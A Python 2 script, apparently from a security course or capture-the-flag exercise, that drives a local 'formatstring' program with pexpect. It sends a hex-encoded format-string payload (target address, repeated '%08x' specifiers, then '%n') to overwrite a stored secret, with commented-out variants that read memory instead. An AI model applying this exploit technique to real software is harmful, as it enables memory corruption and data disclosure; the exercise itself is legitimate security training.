import pexpect, os, subprocess, argparse, binascii

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--secret_1", help="Input a value to change what is stored in secret[1]", default="")
    args = parser.parse_args()
    return args

def break_program(size_of_change = ""):
    p = pexpect.spawn("./formatstring")
    print p.readline()
    print p.readline()
    print p.readline()
    address_line = p.readline()
    print address_line
    split_string =  address_line.split()
    decimal_value = int(split_string[4],16)
    print p.readline()
    #p.sendline(str(bytearray.fromhex("94 b0 04 08 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 6e")))                          
    p.sendline(str(bytearray.fromhex("94 b0 04 08 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 6e")))
    #p.sendline(str(bytearray.fromhex("94 b0 04 08 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 73")))
    print p.readline()
    print p.readline()
    print p.readline()
    print p.readline()
    print p.readline()


def main():
    args = get_args()
#    payload = b'94 b0 04 08 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d'                           
 #   print bytes.fromhex(payload)                                                                                                                                                              
    print bytearray.fromhex("94 b0 04 08 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d 25 30 38 78 2d")
#    print hex_string.decode("cp1254").encode("utf-8")                                                                                                                                         
    break_program(args.secret_1)

if __name__ == "__main__":
    main()
